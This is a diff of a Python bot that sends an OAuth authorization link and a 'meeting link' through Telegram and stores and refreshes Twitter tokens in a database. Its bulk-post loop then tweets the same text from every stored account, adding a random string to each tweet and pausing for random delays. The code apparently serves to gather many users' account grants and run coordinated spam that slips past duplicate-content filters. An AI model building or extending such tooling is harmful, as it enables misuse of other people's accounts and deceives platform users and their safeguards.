@@ -5,9 +5,10 @@ import requests
 import time
 import random
 import string
-from config import Config
 import psycopg2
+from config import Config
 
+# Code verifier and challenge functions
 def generate_code_verifier_and_challenge():
     code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
     code_challenge = base64.urlsafe_b64encode(
@@ -15,6 +16,7 @@ def generate_code_verifier_and_challenge():
     ).rstrip(b'=').decode('utf-8')
     return code_verifier, code_challenge
 
+# Send messages and OAuth link functions
 def send_startup_message():
     state = "0"
     code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -25,32 +27,34 @@ def send_startup_message():
         f"🚀 *OAuth Authorization Link:*\n[app link]({authorization_url})\n\n"
         f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
     )
-
     url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": Config.TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
+    data = {"chat_id": Config.TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
     requests.post(url, json=data)
 
 def send_message_via_telegram(message):
     url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": Config.TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
+    data = {"chat_id": Config.TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
     response = requests.post(url, json=data)
     if response.status_code != 200:
         print(f"Failed to send message via Telegram: {response.text}")
 
+# Twitter token and profile functions
+def get_twitter_username_and_profile(access_token):
+    url = "https://api.twitter.com/2/users/me"
+    headers = {"Authorization": f"Bearer {access_token}"}
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        data = response.json().get("data", {})
+        username = data.get("username")
+        profile_url = f"https://twitter.com/{username}" if username else None
+        return username, profile_url
+    else:
+        print(f"Failed to fetch username. Status code: {response.status_code}")
+        return None, None
+
 def post_tweet(access_token, tweet_text):
     TWITTER_API_URL = "https://api.twitter.com/2/tweets"
-    headers = {
-        "Authorization": f"Bearer {access_token}",
-        "Content-Type": "application/json"
-    }
+    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
     payload = {"text": tweet_text}
     response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
     if response.status_code == 201:
@@ -60,6 +64,7 @@ def post_tweet(access_token, tweet_text):
         error_message = response.json().get("detail", "Failed to post tweet")
         return f"Error posting tweet: {error_message}"
 
+# Token refresh and database update functions
 def refresh_token_in_db(refresh_token, username):
     token_url = 'https://api.twitter.com/2/oauth2/token'
     client_credentials = f"{Config.CLIENT_ID}:{Config.CLIENT_SECRET}"
@@ -68,7 +73,6 @@ def refresh_token_in_db(refresh_token, username):
     data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': Config.CLIENT_ID}
     response = requests.post(token_url, headers=headers, data=data)
     token_response = response.json()
-
     if response.status_code == 200:
         new_access_token = token_response.get('access_token')
         new_refresh_token = token_response.get('refresh_token')
@@ -100,7 +104,6 @@ def handle_post_bulk(message):
         base_tweet_text = parts[1]
         min_delay = Config.DEFAULT_MIN_DELAY
         max_delay = Config.DEFAULT_MAX_DELAY
-
         for access_token, _, username in tokens:
             tweet_text = f"{base_tweet_text} {generate_random_string(10)}"
             result = post_tweet(access_token, tweet_text)
